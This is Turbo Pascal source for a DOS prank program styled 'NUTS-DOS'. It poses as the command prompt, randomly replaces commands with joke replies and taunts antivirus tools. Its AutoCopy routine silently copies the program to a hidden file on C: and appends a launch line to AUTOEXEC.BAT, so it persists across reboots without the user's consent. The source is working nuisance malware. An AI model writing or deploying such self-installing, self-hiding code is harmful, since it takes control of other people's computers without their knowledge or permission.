{$M 8192,0,0}
{$G+}
uses dos;
var prompt,x : string;
	 i        : word;
{-----------------------------------------------------------}
procedure gotoxy(x,y : byte);
var regs : registers;
begin
	regs.ah:=$2;
	regs.bh:=0;
	regs.dh:=y;
	regs.dl:=x;
	intr($10,regs);
end;
{-----------------------------------------------------------}
function readkey : char;
var regs : registers;
begin
	regs.ah:=0;
	intr($16,regs);
end;
{-----------------------------------------------------------}
function upstr(var x : string) : string;
var i : byte;
begin
	for i:=1 to length(x) do x[i]:=upcase(x[i]);
	upstr:=x;
end;
{-----------------------------------------------------------}
Procedure Message(x : string);
var z : string;
begin
	if x='APPEND ' then writeln('Appended. Use glue to keep it in one piece.') else
	if x='ASSIGN ' then writeln('So, you always put new names to old things?') else
	if x='ATTRIB ' then writeln('Sorry... The attribs where extinct by the Elders...') else
	if x='BACKUP ' then writeln('YOU back up. You forgot I can''t move...') else
	if x='BREAK '  then writeln('Broken.') else
	if x='CALL ' then writeln('Do you think I am a messenger?') else
	if x='CD '     then writeln('With CD''s, the sound technology is much better, isn''t it?') else
   if x='CHCP ' then writeln('In what language are you speaking?') else
	if x='CHDIR '  then writeln('No. This directory is still virgin.') else
	if x='CHKDSK '  then
	begin
		writeln('Volume NUTS created 02/08/2015 23:57');
		writeln('Errors found, F parameter not specified');
		writeln('Corrections will be written to disk');
		writeln;
		writeln('C:\*.*');
		writeln('Allocation error, size adjusted');
		writeln;
		writeln('8000 lost allocation units found in 8000 chains.');
		writeln('362864 bytes disk space would be freed');
		writeln;
		writeln('362864 bytes total disk space');
		writeln('0.5 bytes in 5 hidden files');
		writeln('360580 bytes in 10000 directories');
		writeln('8 bytes in 50000 user files');
		writeln('0 bytes avaliable on disk');
		writeln;
		writeln('128 bytes in each allocation unit');
		writeln('2834.875 total allocation units on disk');
		writeln('0 avaliable allocation units on disk');
		writeln;
		writeln('655360 total bytes memory');
		writeln('60 bytes free');
	end  else
	if x='CLS ' then
	begin
		for i:=1 to 2000 do write(chr(1));
		gotoxy(1,1);
	end else
	if x='COMMAND ' then writeln('SIT!') else
	if x='COMP ' then writeln('They look the same to me...') else
	if x='CTTY ' then writeln('See, titty, why? Why that?') else
	if x='DATE ' then writeln('At eight o''clock in McDonald''s is good for you?') else
   if x='DBLSPACE ' then writeln('Sorry. My life is resumed only in 2DSPACE.') else
	if x='DEBUG ' then writeln('To DEBUG, you must BUG first.') else
   if x='DEFRAG ' then writeln('Are you too FRAGgy? I preffer do nothing.') else
	if x='DEL ' then writeln('Del... Does it mean "FROM" in spanish?') else
   if x='DELTREE ' then writeln('You are VERY carefull with mother nature. Deleting trees. Imagine.') else
	if x='DIR ' then writeln('No. That is an insult to my inteligence.') else
	if x='DISKCOMP ' then writeln('My disk is much bigger than yours!') else
	if x='DISKCOPY ' then writeln('I am unable to copy a virtual disk to a ram disk.') else
	if x='DOSKEY ' then writeln('I hate DOSKEY. I prefer MadKey.') else
	if x='DOSSHELL ' then writeln('PcTools 1.0 is much better to use.') else
	if x='ECHO ' then writeln('I am not a parrot!') else
   if x='EDIT ' then writeln('No. I''m too busy to do such thing.') else
	if x='EDLIN ' then writeln('Why don''t you use Chi Writer? It is better than EDLIN.') else
	if x='EMM386 ' then writeln('Buy more memory for me, I just have a little reminding...') else
	if x='ERASE ' then
	begin
		write('Enter Password: ');
		readln(z);
		writeln('Password correct. Access denied anyway.');
	end else
	if x='EXE2BIN ' then writeln('EXE3CROUD, EXE4DOME, etc...') else
	if x='EXIT ' then writeln('Sorry, but I am unable to move. YOU leave.') else
	if x='EXPAND ' then writeln('I am not a balloon!') else
   if x='FASTHELP ' then writeln('If you want fast help, call 911.') else
	if x='FASTOPEN ' then writeln('Slowclose.') else
	if x='FC ' then writeln('FC??? What do you mean with that?') else
	if x='FDISK ' then writeln('The Floppy DISKs are A: and B:') else
	if x='FIND ' then writeln('The search string was never lost.') else
	if x='FORMAT ' then writeln('This machine cannot format. Use preformatted disks only.') else
	if x='GRAFTABL ' then writeln('This program requires Macrosoft Doors') else
	if x='GRAPHICS ' then writeln('If you want graphics, why don''t you buy a Mac?') else
	if x='HELP ' then writeln('Call your mom!') else
   if x='INTERLNK ' then writeln('Your serial ports is seriously paraletic.') else
   if x='INTERSVR ' then writeln('Press any key to see a key pressed.') else
	if x='JOIN ' then writeln('I am not a joinable boy!') else
	if x='LH ' then writeln('Use LOADHIGH instead LH.') else
	if x='LOADFIX ' then writeln('Do you want me to load or to fix? Both I can''t do!') else
	if x='LOADHIGH ' then writeln('Savelow.') else
	if x='KEYB ' then writeln('Your keyboard cannot be changed.') else
	if x='LABEL ' then writeln('I don''t like labels. They are so nominative!') else
	if x='MD ' then
	begin
		writeln('General failure reading drive T:');
		write('Abort, Retry, Ignore, Fail, Give up, Halt, Oops?');
		z[2]:=readkey;
	end else
	if x='MORE ' then writeln('You want more, but I will give you less.') else
	if x='MEM ' then writeln('If I have some...') else
   if x='MEMMAKER ' then writeln('I just use memories. I cannot make them.') else
	if x='MIRROR ' then writeln('Oh... Unfortunately I have none in my warehouse.') else
	if x='MKDIR ' then writeln('No... I am tired and build directories is a hard work...') else
	if x='MODE ' then writeln('All outputs redirected to joystick port.') else
   if x='MSBACKUP ' then writeln('MS Backed up? What the hell I have to do with that?') else
   if x='MSD ' then writeln('MSD, DDT, TNT... All this political parties makes me sick.') else
	if x='NLSFUNC ' then writeln('Please, say that in english!') else
	if x='PATH ' then writeln('All paths leads to rome...') else
   if x='POWER ' then writeln('I have power enough to disturb you.') else
	if x='PRINT ' then writeln('I must to. I can''t write in cursive.') else
	if x='QBASIC ' then writeln('It should be QCOMPLEX.') else
	if x='PROMPT ' then writeln('What, do you think I am a dog?') else
	if x='RD ' then
	begin
		writeln('Invalid path, not directory, directory not empty,');
		writeln('or directory too important to remove.');
	end else
	if x='RECOVER ' then writeln('Thank you. I''m better now.') else
	if x='REN ' then writeln('I prefer the ZEN.') else
	if x='RENAME ' then writeln('No. The older name is better.') else
	if x='REPLACE ' then writeln('I am not a thief.') else
	if x='RESTORE ' then writeln('Why? I don''t took anything!') else
	if x='RMDIR ' then writeln('Use RD, is much handsome!') else
	if x='SELECT ' then writeln('Hum... Number 3.') else
	if x='SET ' then writeln('No, I don''t have any TV set.') else
	if x='SETVER ' then writeln('Don''t you mean SETTER?') else
	if x='SHARE ' then writeln('Thanks! I love to share everything!') else
	if x='SORT ' then writeln('Using Quicksort, Bubblesort, or what?') else
	if x='SUBST ' then writeln('The older is broken? That''s why i need to substitute?') else
	if x='SYS ' then writeln('BRO ') else
	if x='TIME ' then
	begin
		writeln('Current time is NOW');
		write('Enter new time: ');
		readln(z);
		writeln('Invalid format');
	end else
	if x='TREE ' then writeln('I have a redwood. And You?') else
	if x='TYPE ' then writeln('You are the typist here!') else
	if x='UNDELETE ' then writeln('Why you deleted it if you wanted it?') else
	if x='UNFORMAT ' then writeln('This system can''t unformat. Use pre-unformatted disks only.') else
	if x='VER ' then
	begin
		writeln('NUTS-DOS Version 2.0');
		writeln;
	end else
	if x='VERIFY ' then writeln('It is still there and untouched.') else
	if x='VOL ' then
	begin
		writeln;
		writeln('Volume in Drive O is Nuts');
	end else
   if x='VSAFE ' then writeln('Safe is where you put your money. Vsafe is where you put your V''s.');
	if x='XCOPY ' then writeln('220 X''s copied.') else

	if x='PCSHELL ' then writeln('Type in DOSSHELL. It is much better') else
	if x='PCTOOLS ' then writeln('Hammers, alligators, etc...') else
	if x='TC ' then writeln('Turbo Basic is easier to use.') else
	if x='TCC ' then writeln('TCCC. I won.') else
	if x='WIN ' then writeln('Lose.') else
	if x='A: ' then chdir('b:') else
	if x='B: ' then chdir('a:') else
	if x='C: ' then writeln('Invalid drive specification') else
	if x='D: ' then writeln('E:, F:, G:...');
	writeln;
end;
{-----------------------------------------------------------}
Procedure Play;
var y : ^byte;
	 x : byte;
	 z : byte;
	 t : byte;
	 c : char;
begin
	randomize;
	for i:=1 to 2000 do write(chr(32));
	gotoxy(1,1);
	write('Look at your keyboard lights...');
	y:=ptr($40,$17);
	x:=y^;
	for z:=0 to 255 do
	begin
		y^:=random(256);
		for t:=0 to 127 do begin gotoxy(random(79),random(24)); write('.'); end;
	end;
	y^:=x;
	writeln;
	for i:=1 to 2000 do write(chr(32));
	gotoxy(1,1);
end;
{-----------------------------------------------------------}
Procedure AutoCopy;
var
  FromF, ToF: file;
  f          : text;
  NumRead, NumWritten: Word;
  buf: array[1..2048] of Char;
  s:searchrec;
begin
  Assign(FromF, ParamStr(0));
  Reset(FromF, 1);
  Assign(ToF, 'C:\NUTS.EXE');
  Rewrite(ToF, 1);
  repeat
	 BlockRead(FromF,buf,SizeOf(buf),NumRead);
	 BlockWrite(ToF,buf,NumRead,NumWritten);
  until (NumRead = 0) or (NumWritten <> NumRead);
  Close(FromF);
  Close(ToF);
  setfattr(ToF,hidden);
  findfirst('c:\autoexec.bat',anyfile,s);
  if doserror=0 then
  begin
	  assign(f,'C:\AUTOEXEC.BAT');
	  append(f);
	  writeln(f,'@echo.');
	  writeln(f,'@nuts NOINSTALL');
	  writeln(f,'@echo.');
	  close(f);
  end;
  play;
end;
{-----------------------------------------------------------}
{  ****$G-}
procedure Test286;
{-----------------------------}
function Is286Able: Boolean; assembler;
asm
        PUSHF
        POP     BX
        AND     BX,0FFFH
        PUSH    BX
        POPF
        PUSHF
        POP     BX
        AND     BX,0F000H
        CMP     BX,0F000H
        MOV     AX,0
        JZ      @@1
        MOV     AX,1
@@1:
end;
{-----------------------------}
begin
  if not Is286Able then
  begin
	 Writeln('Need at least an 80286-compatible system to run this program');
    Halt(1);
   end;
end;
{   ***$G+}
{-----------------------------------------------------------}
begin
	if paramstr(1)<>'NOINSTALL' then autocopy;
	test286;
	writeln;
	randomize;
	repeat
		getdir(0,prompt);
		write(prompt,'>');
		readln(x);
		x:=upstr(x)+' ';
		setcbreak(false);
		if (copy(x,1,pos(' ',x))='CPAV ') then writeln('This doesn''t work!')  else
      if (copy(x,1,pos(' ',x))='MSAV ') then writeln('This also doesn''t work!')  else
		if (copy(x,1,pos(' ',x))='SCAN ') then writeln('Call John McAffee!')  else
		if (copy(x,1,pos(' ',x))='NAV ') then writeln('Mr. Peter Potamus Norton never saw me.')  else
		if (copy(x,1,pos(' ',x))='CLEAN ') then writeln('I did not mess anything! Why should I clean it?')  else
		if (copy(x,1,pos(' ',x))='FUCK ') then writeln('My, what a filthy mind you have!')  else
		if (copy(x,1,pos(' ',x))='SHIT ') then writeln('If I do that, will you clean it up?')  else
		if (trunc(random(2))+1=2)and(x<>'GO AWAY! ') then
		message(copy(x,1,pos(' ',x)))  else
		begin
			if x<>'GO AWAY! ' then
			begin
				swapvectors;
				exec(getenv('COMSPEC'),'/C '+x);
				swapvectors;
			end;
			writeln;
		end;
	until x='GO AWAY! ';
	writeln('Ok! But I''ll return!...');
	writeln;
	setcbreak(true);
end.
